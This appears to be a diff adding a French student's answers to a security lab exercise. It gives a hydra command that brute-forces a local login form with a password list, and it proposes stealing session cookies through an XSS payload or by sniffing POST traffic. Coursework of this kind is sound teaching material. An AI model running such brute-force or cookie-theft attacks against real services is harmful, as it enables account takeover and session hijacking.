@@ -1,0 +1,19 @@
+Coutard
+Antoine
+
+Ex1
+
+  q1. voir fichier marc.txt
+  q2. hydra -l marc.martin@gmail.com -P marc.txt 127.0.0.1 http-post-form "/auth.php:username=marc.martin@gmail.com&password=^PASS^:Invalid Password!"
+
+Ex2
+
+  1ere méthode:
+    On peut simplement utiliser une faille XSS gràce au formulaire pour récuperer les identifiants
+    de session.
+      <script>alert(‘document.cookie’)</script>
+
+  2eme méthode:
+    On peut aussi récupérer les trames en sniffant le réseau. L'identifiant de session est visible
+    dans la requête POST
+    
